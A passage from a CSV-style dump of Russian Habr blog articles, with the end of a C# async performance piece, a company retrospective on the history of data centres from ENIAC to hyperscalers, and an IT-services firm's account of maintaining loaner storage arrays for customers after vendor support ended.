обратитесь к пятой главе книги «C# для профессионалов» Джона Скита.Что с производительностью нового сервера? Он работает с той же скоростью, что и предыдущий — тысяча запросов в секунду. Раскомментировав строку await Task.Delay(100) — корректную замену Task.Delay(100) для асинхронного кода, — мы не увидим никакой потери производительности.Насколько наша программа стала быстрее? Производительность зависит от множества факторов, и точных чисел я вам не назову. Условно можно считать, что асинхронный код на том же железе обрабатывает в 3–5 раз больше запросов, чем параллельный.Производительность достигается не за счёт большей скорости, а за счёт большего потребления процессорного времени."
39,От арифмометров к гипермасштабным ЦОДам или как хранилища для серверов превратились в города для данных,КРОК,Компания,0,"Программное обеспечение, Аппаратное обеспечение",2025-04-10,"Когда-то вычисления требовали терпения, ловкости рук и арифмометра. Сегодня же банковские переводы приходят за доли секунды, соцсети нон-стоп транслируют рилсы, в облаках хранятся и обрабатываются террабайты фотографий. Все это уже невозможно без гигантских дата-центров, где данные циркулируют со скоростью, о которой создатели мейнфреймов 1960-х годов могли только мечтать. Какое развитие дата-центры прошли за эти десятилетия, почему без них невозможен интернет и как современный ЦОД похож на небольшой город – в нашей ретроспективе.Мейнфрейм вместо арифмометраИстория дата-центров уходит корнями в далекие 1940-е. Тогда самым крутым гаджетом своего времени был ENIAC (сокр. от Electronic Numerical Integrator and Computer) – первый в мире электронный цифровой интегратор и компьютер. Эту махину собрали для армии США, чтобы рассчитывать траектории артиллерийских снарядов во Вторую мировую. Позже ENIAC подключили к секретной программе США по разработке ядерного оружия во время Второй мировой войны – Манхэттенскому проекту. Вот такая скромная судьба.ENIAC (Electronic Numerical Integrator and Computer)Первые дата-центры были настоящим вызовом для инженеров того времени. Оно и понятно: в начале эры вычислительных центров не было общепринятых стандартов проектирования и эксплуатации подобных объектов. Серверы, сети, системы охлаждения, электропитания, резервного копирования – все это создавалось с нуля. Из-за того, что дата-центры потребляли огромное количество электроэнергии, инженерам приходилось искать новые способы минимизации затрат на электроэнергию, одновременно обеспечивая бесперебойную работу компьютерного центра. Конечно, потребление крупным дата-центром того времени нескольких сотен киловатт не стоит сравнивать с современными ЦОДами, для которых десятки и сотни мегаватт – не предел, тем не менее для своего времени это было значительным расходом энергии. Кроме того, технологии в ИТ-сфере развивались очень быстро, что требовало постоянной адаптации инфраструктуры центра обработки информации под новые требования. Это стимулировало инженеров к гибкости и инновационному подходу.Работали дата-центры, по большей части, на военных и разведку, поэтому охрана здания была как в шпионских фильмах: одна-единственная дверь и никаких окон. Для охлаждения всей этой махины использовали огромные промышленные вентиляторы. Они обеспечивали циркуляцию воздуха и отвод тепла от оборудования. Эти вентиляторы часто изготавливались на заказ, поэтому были очень дорогими. А еще километры проводов и тысячи вакуумных трубок. Проблемы, тем не менее, случались. И нередко: провода перегревались, ломались, а иногда и вовсе вспыхивали, поджигая дорогое оборудование. В период 1950-1960-х годов появился термин «мейнфрейм» – так стали называть большие и мощные компьютеры, способные выполнять сложные вычисления для бизнеса, оборонных систем и научных исследований. Именно ими начали оснащать дата-центры, превращая их в центры обработки и хранения данных. Эти большие и мощные вычислительные машины  могли справляться с серьезными задачами, например, делать расчеты для бизнеса или критически важных систем. Конечно, мощность познается в сравнении. Первые мейнфреймы работали на вакуумных лампах (например, UNIVAC I), более поздние модели – на транзисторах. Тактовая частота составляла от 2,26 КГц до 1,8 МГц, объем оперативной памяти ограничивался 32 КБ (IBM 7090), скорость выполнения арифметических операций измерялась в диапазоне от 2 тыс. до 100 тыс. операций в секунду. Для долгосрочного хранения данных использовались магнитные ленты и диски. Например, объем хранилища на магнитной ленте «достигал» 128 КБ (UNIVAC I), а на первом жестком диске (1956 год, IBM 350 Disk Storage Unit) – 5 МБ. Для сравнения. Современный смартфон (например, iPhone 15 Pro) выполняет около 60 трлн операций с плавающей запятой в секунду – это примерно в 5 млрд раз быстрее, чем IBM 704. PlayStation 5 имеет производительность около 10 терафлопс (10 трлн операций), что делает эту игрушку быстрее любого мейнфрейма 60-х годов в  миллионы раз, ОЗУ в современном ноутбуке (например, 16 ГБ) примерно в миллион раз больше, чем у IBM 7094.Тем не менее, мейнфреймы тех лет были невероятно надежными и справлялись с огромными массивами данных для банков, военных систем и космических программ. Например, IBM 7090 использовался NASA в программе «Аполлон» для полетов на Луну.Стоили, конечно, такие устройства очень дорого. Так, UNIVAC I (1951 год) оценивался в сумму около $1,5 млн (примерно $15 млн сегодня), IBM 7094 (1962 г.) – порядка $3 млн ($30 млн в сегодняшних ценах), IBM System/360 Model 75 – $4–5 млн (более $40 млн сегодня).Компьютер IBM 7094 в машинном зале вычислительного центра Колумбийского университета (1964-1968 годы).Из-за высокой цены мощные вычислительные машины были привилегией крупных игроков, которые автоматизировали свои сложные процессы, повышая их эффективность. Например, Bank of America был одним из первых банков, внедривших  IBM 702 в 1959 году для автоматизации обработки чеков, American Express применял подобные технологии для обработки транзакций и работы с клиентскими счетами. Фондовые биржи (NYSE, Лондонская биржа) задействовали их для расчета курсов акций и обработки сделок. Служили мейнфреймы и в госструктурах: Министерство обороны США «подключало» устройство для обработки разведданных и работы с ядерным арсеналом, ФБР и ЦРУ – для анализа данных и криптографических операций. Разумеется, крупный бизнес также старался быть на технологической волне. General Motors, Ford планировали производство, логистику и расчет зарплат рабочих. US Steel, DuPont «привлекали» вычислительные устройства для управления производственными процессами и расчетов химических реакций.Интернета еще не было, поэтому мейнфреймы работали в изоляции, как автономные острова среди моря арифмометров и кип бумаг. Арифмометр – это такой ретро-калькулятор, только с ручным приводом. Похож на металлическую коробку с рычагами и шестеренками, ручку которой надо крутить, чтобы произвести разные арифметические действия. Им пользовались бухгалтеры, инженеры, математики и прочие. В отличие от современных калькуляторов арифмометр не разряжался в самый неподходящий момент, но мог неожиданно заклинить, заставляя владельца задуматься о запасной копии вычислений на бумаге.Арифмометр SchubertПример из воспоминаний Питта Тернера, главы Uptime Institute: «Вечером прибывают грузовики с бумагами. Ночью данные обрабатываются, создаются новые распечатки, а затем эти документы отвозятся обратно в филиалы банков, чтобы они могли открыться утром». Выглядит это так: операторы вручную заносят данные с документов в систему с помощью перфокарт или лент. Каждая операция кодируется в виде последовательности отверстий в карточках, которые затем сортируются и отправляются в вычислительный центр. Похоже на сцену из ретро-фильма, но тогда это был топ технологий.Uptime Institute – независимая консалтинговая организация, специализирующаяся на повышении производительности, эффективности и надежности критически важной инфраструктуры. Она известна разработкой системы классификации уровней (Tier) для оценки надежности и производительности центров обработки данных. С момента создания системы классификации уровней Uptime Institute выдала более 1700 сертификатов Tier в более чем 100 странах. Штаб-квартира Uptime Institute находится в Нью-Йорке, США.В 1970-е  мощность компьютеров росла так быстро, что бюджеты едва успевали за ними. Персональные компьютеры уже стали появляться, но мейнфреймы еще держали марку. Главный их плюс был уже не в скорости, а в надежности. Правда, содержать их оставалось дорогим удовольствием, поэтому многие компании махнули рукой на свои «железные парки» и перешли на аутсорсинг. Так началась эра, когда за вычислительную мощность стали платить, как за аренду квартиры – пусть не свое, зато работает. Этот подход в итоге стал предшественником облачных вычислений, где ресурсы арендуются у специализированных провайдеров.Кампус Цитадель, Невада (США). Площадь – примерно 720 тыс. кв метров. Мощность – 130 мегаватт (МВт).Идеальный шторм в море ЦОДовВ 1990-е началась эпоха перемен – тот самый «идеальный шторм», который смыл мейнфреймы с их пьедестала. Виной всему были микропроцессоры, интернет и модная на тот момент клиент-серверная модель вычислений. Микропроцессоры сделали компьютеры дешевле, компактнее и доступнее. Если раньше вычисления концентрировались на мощных мейнфреймах, то с развитием процессоров стало возможным использовать множество менее дорогих серверов. Интернет изменил способы обработки и передачи данных. Вместо локальных вычислений на мейнфреймах компании стали строить распределенные сети, где расчеты производились на разных машинах, соединенных через интернет. Клиент-серверная модель позволяла обрабатывать данные не на одном мощном компьютере (как в мейнфрейме), а распределять нагрузку между серверами и клиентскими устройствами. Это дало больше гибкости и снизило стоимость инфраструктуры. Все это в совокупности сделало мейнфреймы менее привлекательными и подтолкнуло компании к переходу на новые технологии. Помещения старых мейнфреймов быстро заполнили серверы, а оттуда было рукой подать до первых полноценных дата-центров. Инфраструктура стала стандартизированной, появились модульные стойки – эти самые стеллажи, без которых сегодня не обходится ни один ЦОД.Бизнес тоже приспособился. Поскольку жить без интернета стало нереально, подключение к сети стало обязательным условием для выживания. Провайдеры взяли все в свои руки: размещали клиентское оборудование у себя, обеспечивали его питанием, обслуживали и подключали к мощным каналам связи. Это помогло сэкономить на «последней миле» – том самом кабеле от провайдера до клиента. Так началась гонка: интернет-провайдеры и хостинговые компании начали массово строить свои дата-центры, и этот рынок резко пошел в рост.Lakeside Technology Center, Чикаго (США). Площадь – более 100 тыс. кв. метров. Мощность – 100 мегаватт (МВт).Сегодняшние дата-центры – уже не просто серверные комнаты, а настоящие форпосты цифровой эпохи. С их помощью компании запускают свои приложения, хранят данные и управляют всем, что связано с ИТ. Внутри современного  ЦОДа  серверы, сетевое оборудование, системы охлаждения, кабели, охрана, а еще – надежная энергетическая инфраструктура, чтобы все это хозяйство не перегрелось и не погасло. Компании предпочитают собирать все свое ‭«железо» под одной крышей, потому что так удобнее и безопаснее, чем держать оборудование в каждом филиале. А вот иметь свой собственный ЦОД или арендовать у провайдера – это уже дело вкуса и бюджета.Каждый день человечество накидывает больше 2,5 млн терабайт данных, которые требуют хранения и обработки. Судя по растущим потребностям на мощные вычисления, спрос на дата-центры будет только расти.  В 2022 году по миру насчитывалось более 800 гипермасштабируемых ЦОДов (гиперскейлеров) – огромных цифровых «устройств» для больших данных, ИИ и интернет-кабелей. Половина этих гигантов базируется в США, причем треть мощностей сосредоточена в штате Вирджиния. Этот регион уже называют мировой столицей интернета. Теперь про размеры этих монстров. Utah Data Center – 93 тысячи квадратных метров! Это уже не дата-центр, это город для серверов. В нем трудится Cray XC30 – суперкомпьютер с мощностью 100 петафлопс в секунду. А в Чикаго есть Lakeside Technology Center площадью 102 тысячи квадратов. Этот ЦОД отслеживает динамику  фондовых бирж. У него четыре магистральных канала связи, три источника питания и бассейн на три миллиона литров охлаждающей жидкости. Не дата-центр, а техно-спа! Стараются не отставать и китайские ЦОДостроители. Гигант China Telecom Data Center занимает около миллиона квадратных метров! Этот как целый район, забитый серверами. Обошелся он инвесторам в $2,5 млрд и расположился в прохладной Внутренней Монголии. Причина выбора места – тут холодно большую часть года, так что оборудование охлаждается почти бесплатно. Гиперскейлеры ЦОД растут как грибы после дождя, с темпами более 13% в год. Эксперты полагают, что в 2025 году их количество перевалит за тысячу. Дата-центр Digital Beijing (Пекин).В нем совмещены функции инфоцентра и автоматического техконтроля.Объект окружает стеклянная стена, которая задерживает проникающее тепло, таким образом снижая затраты на охлаждение систем.Площадь – около 97 тыс. кв. метров.В последние годы компании все чаще отказываются от своих локальных дата-центров и переходят на арендуемые площадки – это называется colocation. Такие центры предлагают все необходимое для своих клиентов: мощные каналы связи (10 Гбит/с и выше), высокую надежность (уровень Tier III) и минимизацию простоев. Но это лишь начало истории. Многие компании уже переходят на облачные решения. Зачем возиться с железом, если можно арендовать нужные мощности в облаке? Облака дают свободу от управления физической инфраструктурой и массу преимуществ: гибкость, масштабируемость и возможность платить исключительно за то, что используешь.Сегодня colocation-операторы предлагают не только физическое пространство, но и умные решения. Например, можно комбинировать выделенные машины с облачной инфраструктурой, запускать контейнеры в Kubernetes, а резервные копии отправлять в распределенные хранилища, где они будут в безопасности.В итоге арендуемые ЦОДы превращаются в нечто большее, чем обычные дата-центры. Они становятся платформами, которые обеспечивают отказоустойчивость, высокую скорость и, что самое важное, избавляют бизнес от лишней головной боли, позволяя сосредоточиться на главном.Вот и получается, что бизнес операторов дата-центров процветает. Цифры говорят сами за себя: в 2022 году глобальные капиталовложения в дата-центры выросли на 15%, достигнув $241 млрд. Половину этого пирога «съели» десять крупнейших облачных провайдеров. А поставщик серверов номер один – Dell, – держит первенство, за ним идут HPE и Inspur.Динамика развития российского рынка ЦОДов также внушительная. По данным исследования аналитической компании iKS-Consulting, рост стойко-мест в России в 2022 году составил 10,8%, в 2023-м – 20,7%, в 2024-м – более 17%. Однако и при таком массовом вводе стойко-мест в эксплуатацию ликвидировать их дефицит на рынке пока не удалось: спрос на новые стойко-места превышает предложение. Видимо, поэтому аналитики iKS-Consulting даже по пессимистическому сценарию прогнозируют рост российского рынка в 2025 году еще на 11,6%. Многие крупные компании заказывают стойко-места еще на стадии строительства и бронируют часть стоек на 1-2 года вперед, предусматривая расширение компании. А сегодня, если учесть «нашествие» искусственного интеллекта и кратный рост больших данных, расширение бизнесу точно понадобится.Сжатие гиперскейлеров до размеров смартфонаСвой закон о том, что количество транзисторов на чипе будет удваиваться каждые два года, американский инженер Гордон Мур сформулировал в 1965 году. Но даже он не подозревал, что через несколько десятков лет эти транзисторы заполнят не только все чипы на планете, но и миллионы серверных полок в дата-центрах. Далее роль все увеличивающихся чипов по закону того же Мура уже будут играть центры обработки информации: раздуваясь до гиперскейлеров, они становятся такими же важными для людей, как и сама жизнь.Если верить экспертам и футурологам, то через пару десятилетий дата-центры могут превратиться в сверхтехнологичные объекты. Основатель Dell Technologies Майкл Делл (Michael Saul Dell) предрекает дата-центрам гибридизацию – сочетание облачных технологий, edge computing (данные обрабатываются ближе к месту их создания) и квантовых вычислений. CEO Google Сундар Пичаи (Sundar Pichai) неоднократно подчеркивал, что будущее дата-центров связано с устойчивым развитием и энергоэффективностью. Технологический футуролог Джордж Гилдер утверждает, что квантовые вычисления радикально изменят ландшафт дата-центров. По его мнению, квантовые компьютеры смогут выполнять задачи, которые сейчас требуют огромных вычислительных мощностей, в формате гораздо более компактных устройствах. Он же считает, что оптические сети сделают дата-центры более эффективными и распределенными благодаря огромным скоростям и минимальным задержкам.В технологической среде иногда высказываются мнения, что внедрение технологий, о которых сейчас идет речь, способно не просто уменьшить площади под строительство гиперскейлеров, а превратить дата-центры в устройство размером со смартфон. Конечно, можно представить себе картину, когда в кармане у человека маленький гаджет, а внутри него – целая сеть серверов, готовых в секунду обработать даже данные с орбитальной станции о движении галактик.И, конечно, сегодня только ленивый не говорит о необходимости начать строить дата-центры на дне океана, в Арктике, в космосе, на Луне, Марсе и так далее. Как будут развиваться дата-центры – покажет время. Главное, это должно быть безопасным для отдельно взятого человека с ЦОДом в кармане – неизвестно же, сколько тепла он выделит, если вдруг займется расчетом траектории кометы, пролетающей мимо планеты Земля. "
40,Нет вендорской поддержки? Нет проблем! Как мы внедрили подменные СХД,К2Тех,Компания,0,"Программное обеспечение, Аппаратное обеспечение, Информационная безопасность",2025-04-10,"Привет, Хабр! Меня зовут Иван Звонилкин, я эксперт направления сервисной поддержки вычислительной инфраструктуры в компании K2Tех. Сегодня хочу рассказать, как в новых реалиях мы сохранили высокий уровень обслуживания систем хранения данных после ухода западных вендоров с российского рынка.Энтерпрайзные СХД — пожалуй, самый сложный в обслуживании элемент ИТ-инфраструктуры. В отличие от серверов с их относительной открытостью, системы хранения — черные ящики с закрытым проприетарным ПО. И если раньше в критических ситуациях мы могли рассчитывать на поддержку вендоров, то в 2022 году оказались предоставлены сами себе.Мы всегда стараемся искать и тестировать новые подходы к обслуживанию, чтобы работать на опережение и предотвращать проблемы до того, как они произойдут. Конечно, мы живем в реальном мире, и тоже сталкиваемся с черными кошками, «перебегающими дорогу и ломающими обрудование» в серверной. Но это не пугает команду, а наоборот стимулирует нестандартно мыслить для решения задачи.В этот раз я расскажу о создании парка подменных СХД, которые позволяют безопасно обслуживать и ремонтировать критичные системы без риска потери данных заказчика. Поделюсь реальными кейсами, сложностями, с которыми столкнулись, и выводами, которые будут интересны всем, кто занимается эксплуатацией корпоративных СХД в текущих условиях.Скрытый текстСпойлер для самых нетерпеливых: да, при должной подготовке и правильном подходе можно обеспечить высокий уровень сервиса даже без поддержки вендора. И это не обязательно должно быть дорого.Раньше за СХД отвечали вендоры — особенно во время ремонта. У них были четкие регламенты, сроки поставки запчастей и доступ к экспертам высшего уровня. Вендоры выступали непререкаемым авторитетом для заказчиков, а их планы по устранению проблем воспринимались как истина в последней инстанции. Если заказчик не мог сразу выполнить рекомендации, он всё равно подстраивался под вендора. Кто же станет спорить с производителем?В те времена мы чувствовали поддержку «большого брата», который должен был помочь в сложной ситуации. Обычно работа по инструкциям производителей была удобной и эффективной. Впрочем, это не значит, что вендор был всегда прав. Вспоминается инцидент у одного заказчика после обновления большой распределенной СХД по вендорскому экшн-плану.После того как половина узлов загрузилась с новой ОС, случился редкий баг — кластер просто не понял, перешла на них нагрузка или нет. Из-за этого автоматический откат прошивки пошёл наперекосяк, и система, чтобы не потерять данные, решила перезагрузить вообще все узлы и вернуться к старой версии.СХД была недоступна всего шесть минут, но последствия ощущались еще долго — некоторые сервисы поднимались аж до 6 часов. Были остановлены склады, сервисы и работа персонала, что вело к упущенной прибыли, убыткам и другим потерям. Заказчик пригрозил штрафными санкциями, но размытые формулировки в соглашениях с вендором не позволяли рассчитывать на победу в суде.Свобода маневраРаньше мы не брали на полное обслуживание сложные системы хранения данных. Предполагалось, что наша команда обеспечивает базовую и среднюю поддержку (L1 и L2), а кейсы выше решает вендор. Даже обучение специалистов не предусматривало передачу знаний уровня L3. А теперь и L3-поддержка стала нашей, только практически без возможности получить консультацию производителя.После ухода производителей с российского рынка заказчики стали требовать гарантий бесперебойной работы вендорского оборудования. Однако ни один самый гениальный инженер в сложившейся ситуации этого не гарантировал:что-либо всегда может пойти не так. И чем опытнее инженер, тем лучше он понимает, сколько незапланированных ситуаций может приключиться.Некоторые крупные заказчики со значительными ресурсами минимизировали риски покупкой дополнительного оборудования. Перед началом работ они переносят данные на резервную СХД, и с основной можно спокойно работать. Вот только дублировать подобное оборудование — очень дорого. Для большинства заказчиков из малого и среднего бизнеса работы приходится проводить прямо на продуктивной системе со всеми вытекающими рисками. Как защититься от возможных негативных последствий? По нашему опыту могу сказать, что тут два пути: выдерживать давление и постоянно быть в ожидании худшего или взять ситуацию в свои руки.Жесткий стресс и вот — новый подходБыл у нас «переломный» кейс, показавший, что работать вдолгую без нормального резерва попросту невозможно. Примерная иллюстрация той ситуацииЭто был заказчик с небольшой вроде бы системой: всего 9 дисков, но это были NVMe диски емкостью 19 терабайт каждый. В моменте у нас в резерве было всего два или три таких накопителя. Однако в тот раз начался какой-то дисковый апокалипсис: SSD сыпались один за другим.Мы заменили три за неделю — и резерв был исчерпан. Обычно больше и не резервируют, ведь есть средний процент поломок, и на этом строится вся логистика в нашей работе. Новые диски ждать долго, нужно чинить, а места для переноса такого количества данных у заказчика нет и... по SLA у нас намечается полная катастрофа. В срочном порядке начали поиск необходимых дисков по всем доступным каналам. С горем пополам проблему тогда решили, диски нашли и даже статью написали.В принципе можно было бы арендовать систему хранения данных того же класса у партнеров, но на практике это не вариант. Никто не предоставит нам систему за миллионы рублей по первому звонку без документальной подстраховки. А это сплошная бюрократия: согласование стоимости и сроков, подписание договора. Оформление документов может затянуться на неделю, хотя нашим клиентам часто нужно решить проблему за сутки. А ещё надо учитывать время на перенос данных на временное хранилище.В общем, после этого случая мы ясно поняли, что без собственного резерва СХД просто не обойтись. Если у К2Тех будет свой стратегический запас, то мы сможем давать заказчикам страховку в виде подменной СХД, снимая их опасения. А сами будем спокойно обслуживать их оборудование без рисков и нервов.Подменный фондИтак, решено: делаем парк подменных СХД. Обсудили проект с инженерами и руководителями команд, и решили собирать два типа систем:«Быстрые» СХД — набитые NVMe SSD с быстрыми контроллерами, но с относительно небольшой емкостью, например, 100 ТБ полезного объема. Это хороший вариант для высоконагруженных систем и баз данных.«Емкие» СХД — большой полезный объем, 200–300 ТБ, но на шпиндельных дисках. Идеальны для холодных данных, бэкапов и других задач, где скорость не критична.Чтобы обеспечить замену, нужно было минимум по две СХД каждого типа. Сейчас, опираясь на накопленный опыт, видим, что такого количества вполне достаточно. Большинство кейсов длится не больше пары недель, поэтому наложений пока не было. Хотя пересечения в использовании СХД одного типа на пару дней случались: одну только собирались вернуть, а вторую уже нужно было забирать.Мы продолжаем собирать статистику и при необходимости скорректируем количество систем. Скорее всего, потребуется увеличить парк СХД с SSD, так как они оказались наиболее востребованными.При выборе характеристик систем ориентировались на наиболее распространенные конфигурации, поскольку учесть все возможные пограничные варианты невозможно. Быстрая СХД. Вариант 1: В каждом из двух контроллеров стоит 8-ядерный процессор Intel Skylake 2.3 ГГц, 128 ГБ кэша, интерфейсы 2×10 Гб Ethernet (iSCSI) + 4×32 Гб Fibre Channel для связи с хостами. Диски — 19.2 ТБ NVMe QLC (проприетарные FlashCore от IBM со сжатием до 2:1 на лету на уровне диска). Полезное пространство — 155 ТБ (без учёта сжатия). Всё это в компактном корпусе формата 1U.Быстрая СХД. Вариант 2: В каждом из двух контроллеров установлены два 8-ядерных процессора Intel Skylake 1.7 ГГц, 128 ГБ кэша, интерфейсы 4×10 Гб Ethernet (iSCSI) + 8×16 Гб Fibre Channel для связи с хостами. Диски — 4.8 ТБ NVMe TLC (проприетарные FlashCore от IBM со сжатием до 2:1 на лету). Полезное пространство — 80 ТБ (без учёта сжатия). Корпус формата 2U.Емкая СХД. Вариант 1: В каждом из двух контроллеров используется 32-ядерный ARM процессор Kunpeng 920 2.6 ГГц, 128 ГБ кэша, интерфейсы 4×1 Гб Ethernet (iSCSI) + 4×10/25 Гб Ethernet (iSCSI) + 4×32 Гб Fibre Channel для связи с хостами. Установлены диски NL-SAS для данных и отдельно 4 SAS SSD для кэширования. Полезное пространство — 200 ТБ. Корпус состоит из двух полок 2U+4U.Емкая СХД. Вариант 2: В каждом из двух контроллеров стоит процессор Intel Xeon (вендор не раскрывает конкретную модель), 16 ГБ кэша, интерфейсы 4×32 Гб Fibre Channel для связи с хостами. Используются диски NL-SAS. Полезное пространство — 150 ТБ. Корпус формата 2U.Наши инженеры не хотели, чтобы железо простаивало. Поэтому мы приняли решение в периоды, когда системы не задействованы у заказчиков, использовать их для обучения персонала. Для этого приобрели оборудование тех производителей, с которым даже новички могут быстро разобраться без особых проблем.Дальше предстояло сделать процесс предоставления подменной СХД максимально комфортным: просто заявка от заказчика и обсуждение проблемы, согласование конфигурации — и поехали.Признаюсь, мы немного схитрили: пока юристы готовили внутренние инструкции и регламенты, мы уже начали выдавать подменные СХД инженерам без лишней бюрократии внутри К2Тех. Да, теоретически это повышало риски в случае порчи или невозврата оборудования, но наши заказчики — не случайные люди, а серьезные компании. Мы сделали выбор в пользу их удобства, а потом уже дополнительно проработали с юристами процедуры и придумали, как проще зафиксировать новую практику в документах.Подмена СХД на практикеЦОДы большинства наших крупных клиентов расположены в Москве и Московской области. Для обслуживания этих объектов мы используем собственную службу доставки с выделенными автомобилями для срочных заказов. Одна машина всегда наготове, поэтому через 1–3 часа после принятия решения об отправке подменную СХД уже выгружают на площадке клиента. Если речь идет о компактной 1U и 2U флеш-системе без движущихся элементов, можно обойтись минимальной упаковкой. Наши водители обучены правильному обращению с оборудованием и знают особенности его транспортировки. В города с авиасообщением запчасти отправляются экспресс-доставкой. Тут уже нужна правильная и надежная упаковка, за которую отвечает наш склад и логистика. На объектах перенос данных обычно выполняют системные администраторы заказчика, а наши инженеры оказывают консультационную поддержку.При переносе данных они вместе анализируют, как настроены LUN, пулы, RAID-группы и стараются воспроизвести это на подменной СХД. Зачастую на СХД объемом 200 ТБ полезных данных примерно 110 ТБ, а остальное пространство занимают тестовые и девопс-окружения, которые можно не переносить. Это позволяет существенно ускорить процесс миграции критически важных данных.Подключение временной системы хранения к инфраструктуре заказчика происходит по стандартной процедуре: оборудование интегрируется в сеть хранения данных и подключается ко всем фабрикам по протоколу Fibre Channel. Перенос данных проводится при помощи снапшотов или репликации, в зависимости от используемой системы виртуализации – VMware, OpenStack или других платформ. Заказчики обычно хорошо представляют особенности своих данных, а наши инженеры постоянно отрабатывают миграцию в лаборатории, так что, как правило, все проходит гладко с первой попытки.После окончания обслуживания основной СХД заказчик уничтожает данные на подменной системе. Иногда мы подсказываем клиентам подходящий метод. По ГОСТУ для этого можно использовать специальный софт, он по нескольку раз перезаписывает диски особыми паттернами. Или просто «прибить» все LUNы на СХД и вытащить диски в случайном порядке — собрать данные после этого уже нереально. Однако у большинства крупных компаний есть свои службы ИБ, которые решают этот вопрос самостоятельно. Вспоминается случай, произошедший еще до эпохи дорогостоящих СХД. Тогда мы предоставили заказчику подмену на дешевых SATA дисках. Привезли 10 штук, а увезти не смогли, оказалось — носители информации нельзя выносить с площадки клиента. Требование ИБ. В итоге диски у нас выкупили по остаточной стоимости. Теперь всегда уточняем этот момент, чтобы ненароком не оставить клиенту целую СХД.Какое еще подменное оборудование мы предоставляемХотя в основном это подменные СХД, мы можем выручить и с другими типами оборудования. Серверы x86 обычно не спрашивают, их у большинства заказчиков и так достаточно. Да и с коммутаторами обычно проще решить вопрос ремонтом или полной заменой. Но бывали интересные случаи, когда нам приходилось выходить за рамки обычного подхода.В середине 2022 года у одного крупного, входящего в топ-50, банка, возникла критическая ситуация с серверами Oracle на архитектуре SPARC. На кластере из двух таких машин крутился весь процессинг, и внезапно на одном из серверов вышла из строя плата. Контракт с вендором, как назло, перестал действовать в тот момент. Банк остался с единственным работающим сервером — это реальный риск для всего бизнеса.Мы сами раньше не поддерживали такие сервера и нужной платы у нас не было. Пытались закупить, но поскольку они поставлялись в основном из США, а новые логистические схемы еще не наладились, заказы отменялись или бесконечно задерживались. Решение пришлось искать нестандартное: взяли лабораторный сервер совершенно другой модели, но на том же поколении процессоров. «Добили» его памятью и дисками из того, что было в наличии, и согласовали такое временное решение с заказчиком. Инженеры настроили всё ПО, и банк спокойно работал на нашем сервере пару месяцев, пока нужная плата наконец не доехала.В другой раз выдали заказчику подменную СХД, но выяснилось, что у него не осталось свободных портов в SAN-сети для подключения. Пришлось отправлять целый комплект из трёх устройств: СХД и пару SAN-коммутаторов для организации независимых фабрик согласно лучшим практикам.Кстати, о коммутаторах — иногда предоставляем на подмену SAN-коммутаторы Brocade. Это бывает нужно, когда на оборудовании заказчика требуется провести рисковую операцию с ПО, и клиент хочет перестраховаться, временно перенеся нагрузку на наше оборудование. А наши коллеги из направления сервиса и аутсорсинга телекоммуникационных решений аналогично выручают с подменными LAN-коммутаторами в похожих сценариях.Когда подменная СХД дает бонус к уверенностиПоделюсь случаем из практики. Однажды мы столкнулись с проблемой, которую не могли решить никакими заменами запчастей. Все компоненты казались исправными, но производительность серьезно страдала: наблюдались просадки, выросла latency. Мы перепробовали все возможные методы и обновили прошивки до последних версий — ничего не помогало. Примерно как с Windows, когда всё тормозит без видимой причины. В итоге решили пойти ва-банк и переустановить операционную систему СХД. Но тут уже не получилось бы просто сохранить текущую конфигурацию и переустановить систему с нуля, поскольку RAID-группы, пулы и прочие настройки жестко привязаны к конкретной СХД. Заказчик согласился на это только при условии, что мы сможем перенести все его сотни терабайт данных, протестировать и вернуть обратно. А закрыть заявку без переустановки мы не могли. Кстати, вендор в такой ситуации, скорее всего, не стал бы выходить за рамки классического обслуживания железа и софта. У него есть план действий, который нужно выполнить. Если вы не можете перенести данные — делайте резервную копию на ленточную библиотеку. Мы же предложили обходной путь и сохранили данные заказчика.В другой раз региональный заказчик при апгрейде самостоятельно подключал полки расширения к СХД и нарушил гайд по кабельному соединению. Там была сложная схема SAS-петель, и из-за ошибки часть дисков определялась некорректно. Проблема усугублялась тем, что каблирование никак не отображалось в логах — это чисто физическая структура, причем удаленная. Поскольку это была рабочая продуктивная СХД с несколькими новыми полками, существовал риск потери доступа к данным во время замены контроллеров или SAS-кабелей. Заказчик категорически не соглашался на такой риск. Поэтому инженер, планируя выезд и опираясь на предыдущий опыт, самостоятельно принял решение о подмене СХД. Кстати, у нас нет жесткого регламента, когда и что нужно подменять. Решение принимает инженер на самом первом и близком к проблеме уровне. Если он считает, что это оптимальное решение, то согласовывает с заказчиком и запрашивает СХД через складскую базу.Потом, конечно, выяснилось, что заказчик просто неправильно подключил кабели. Казалось бы, подменную СХД можно было и не везти на объект, но в таких случаях всегда лучше перестраховаться.И еще показательный случай. Требовалось заменить интерфейсную карту на СХД, через которую была подключена вся SAS-петля и, как следствие, зависели десятки дисков. Заказчик задал прямой вопрос о гарантиях: «Вы уверены, что после замены всё запустится и будет работать как положено?» .Снова дилемма для инженера, который понимает, что в процессе работы может возникнуть масса непредвиденных ситуаций. Чтобы не давать пустых обещаний, он честно перечислил все возможные риски, даже те, вероятность которых составляла примерно 0,01%. Заказчику этой информации вполне хватило, чтобы решение снова свелось к временной замене СХД на период ремонта. В этот раз СХД пришлось отправлять из Москвы на самый край страны. Наземная доставка заняла целых 10 дней. Очень долго, но все участники были готовы ждать. К тому же у заказчика отсутствовали свободные FC-порты на коммутаторах, поэтому вместе с СХД пришлось отправить еще и два коммутатора. Мы собрали необходимое оборудование, отправили его и благополучно закрыли заявку. Как видите, у нас сложился вполне рабочий сценарий сервисного обслуживания. Компетенции вендоров в отношении их оборудования могут превосходить наши, но мы компенсируем эту разницу дополнительными уровнями защиты. Это помогает обеспечивать стабильную работу системы даже при возникновении непредвиденных ситуаций.Может показаться, что такой подход требует огромных вложений. На самом деле использование подменных СХД практически не влияет на общие затраты и стоимость сервиса. Мы равномерно распределяем расходы на подобные активы по годовому бюджету, так что они не создают неудобств.В заключение: всегда найдется другое решениеПосле нескольких лет работы в новых реалиях могу с уверенностью сказать: уход вендоров — это вызов, но не приговор. Наш опыт с подменными СХД показал, что даже в отсутствие прямой поддержки производителя можно найти эффективные решения для обеспечения непрерывности бизнеса наших клиентов.Подведу итоги:Наш парк подменных СХД покрывает потребности большинства клиентов и обеспечивает бесперебойную работу их систем во время обслуживания.Такой подход оказался не просто страховкой, но и полезным инструментом для развития компетенций. Подменные системы активно используются для обучения молодых специалистов, когда не задействованы у заказчиков..Иногда простое решение (замена СХД с переносом данных) оказывается эффективнее и безопаснее, чем долгий и рискованный анализ сложной проблемы.В текущих условиях главное — сохранять гибкость мышления и не бояться нестандартных решений. Помимо 